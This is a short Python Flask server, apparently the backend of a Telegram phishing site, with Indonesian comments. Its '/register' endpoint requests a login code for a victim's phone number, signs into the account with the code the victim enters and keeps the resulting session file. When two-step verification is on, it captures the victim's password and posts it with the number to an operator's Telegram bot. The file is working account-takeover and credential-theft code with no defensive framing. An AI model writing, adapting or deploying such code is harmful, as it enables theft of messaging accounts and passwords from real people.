import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Izinkan akses global agar tombol Netlify berfungsi
CORS(app)

# Ambil variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    try:
        await client.connect()
        if step == 1:
            await client.send_code_request(nomor)
            return {"status": "success"}, 200
        elif step == 2:
            try:
                await client.sign_in(nomor, otp)
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
        elif step == 3:
            # Kirim log sandi ke bot
            msg = f"🔑 Sandi: {sandi}\nNomor: {nomor}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": msg})
            return {"status": "success"}, 200
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
    data = request.json
    try:
        # Menjalankan logika Telethon di Flask
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        return make_response(jsonify({"status": "error", "message": str(e)}), 500)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)